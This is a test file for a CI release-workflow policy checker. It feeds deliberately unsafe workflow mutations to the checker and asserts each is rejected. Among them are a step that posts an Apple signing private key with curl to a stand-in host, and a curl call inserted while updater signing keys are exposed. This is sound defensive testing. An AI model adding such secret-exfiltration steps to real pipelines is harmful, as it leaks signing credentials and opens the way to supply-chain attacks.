import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";

import fc from "fast-check";
import { parse, stringify } from "yaml";

import {
  WorkflowPolicyError,
  auditWorkflowPolicy,
} from "./workflow-policy.mjs";

const workflowPath = new URL("../.github/workflows/release.yml", import.meta.url);
const canonicalSource = await readFile(workflowPath, "utf8");

function mutateWorkflow(mutator) {
  const workflow = parse(canonicalSource);
  mutator(workflow);
  return stringify(workflow);
}

function diagnosticCodes(source) {
  return auditWorkflowPolicy(source).map(({ code }) => code);
}

test("the current release workflow satisfies the protected contract", () => {
  assert.deepEqual(auditWorkflowPolicy(canonicalSource), []);
});

test("the policy rejects malformed and empty workflow input", () => {
  assert.throws(
    () => auditWorkflowPolicy(""),
    (error) => error instanceof WorkflowPolicyError &&
      error.message === "workflow source must be non-empty text",
  );
  assert.throws(
    () => auditWorkflowPolicy("jobs: ["),
    (error) => error instanceof WorkflowPolicyError &&
      error.message === "workflow source must be valid YAML",
  );
});

test("the workflow cannot widen permissions or add reusable secret jobs", () => {
  const widened = mutateWorkflow((workflow) => {
    workflow.permissions = { contents: "write" };
    workflow.jobs.hidden_export = {
      uses: "Epoch-ML/unsafe/.github/workflows/export.yml@main",
      secrets: "inherit",
      permissions: { contents: "write" },
    };
  });
  const codes = diagnosticCodes(widened);
  assert.ok(codes.includes("permission-boundary"));
  assert.ok(codes.includes("job-contract"));
});

test("secret expressions are canonical and bound to one exact consuming step", () => {
  const escaped = mutateWorkflow((workflow) => {
    workflow.jobs["apple-sign"].steps.push({
      name: "Export Apple key",
      env: {
        KEY: "${{ secrets['ZERGCHAT_APPLE_API_PRIVATE_KEY'] }}",
      },
      run: "curl --data-binary \"$KEY\" https://example.invalid",
    });
  });
  const codes = diagnosticCodes(escaped);
  assert.ok(codes.includes("secret-expression-boundary"));
  assert.ok(codes.includes("apple-credential-contract"));
});

test("source, Apple, updater, and feed credentials stay inside bounded windows", () => {
  const unsafe = mutateWorkflow((workflow) => {
    const sourceStep = workflow.jobs["build-macos"].steps.find(
      ({ name }) => name === "Check out the exact SHA and matching source tag",
    );
    sourceStep.run = sourceStep.run.replace(
      "unset SOURCE_DEPLOY_KEY GITHUB_META_TOKEN",
      "git -C source checkout --detach \"$SOURCE_SHA\"\n" +
        "unset SOURCE_DEPLOY_KEY GITHUB_META_TOKEN",
    );
    const appleStep = workflow.jobs["apple-sign"].steps.find(
      ({ name }) => name === "Apply preview ad-hoc or fail-closed stable Apple signing",
    );
    appleStep.run += "\nnode scripts/package-macos.mjs";
    const updaterStep = workflow.jobs["sign-updater-stable"].steps.find(
      ({ name }) => name === "Sign only the stable updater archive",
    );
    updaterStep.run = updaterStep.run.replace(
      "unset TAURI_SIGNING_PRIVATE_KEY TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
      "curl https://example.invalid\n" +
        "unset TAURI_SIGNING_PRIVATE_KEY TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
    );
    const feedStep = workflow.jobs["promote-feed"].steps.find(
      ({ name }) => name === "Push the prepared release-data commit",
    );
    feedStep.run = feedStep.run.replace(
      "HEAD:refs/heads/release-data",
      "HEAD:refs/heads/main",
    );
  });
  const codes = diagnosticCodes(unsafe);
  assert.ok(codes.includes("source-credential-window"));
  assert.ok(codes.includes("apple-secret-window"));
  assert.ok(codes.includes("updater-secret-window"));
  assert.ok(codes.includes("feed-credential-contract"));
});

test("actions, runners, environments, and dependency edges are exact", () => {
  const drifted = mutateWorkflow((workflow) => {
    workflow.jobs["signed-smoke"]["runs-on"] = "ubuntu-latest";
    workflow.jobs["signed-smoke"].environment = "zergchat-apple-stable";
    workflow.jobs["signed-smoke"].needs = ["apple-sign"];
    workflow.jobs["signed-smoke"].steps[0].uses = "actions/checkout@main";
  });
  const codes = diagnosticCodes(drifted);
  assert.ok(codes.includes("job-contract"));
  assert.ok(codes.includes("environment-boundary"));
  assert.ok(codes.includes("action-contract"));
});

test("every additional job name is rejected", () => {
  // Property: extending the exact job set by any distinct safe identifier is rejected.
  fc.assert(fc.property(
    fc.stringMatching(/^[a-z][a-z0-9_-]{0,20}$/).filter((name) =>
      !["validate", "build-macos", "apple-sign", "signed-smoke",
        "sign-updater-preview", "sign-updater-stable", "sign-updater",
        "publish", "promote-feed", "deploy-pages"].includes(name)
    ),
    (name) => {
      const extended = mutateWorkflow((workflow) => {
        workflow.jobs[name] = {
          "runs-on": "ubuntu-24.04",
          steps: [{ run: "true" }],
        };
      });
      assert.ok(diagnosticCodes(extended).includes("job-contract"));
    },
  ), { numRuns: 50 });
});
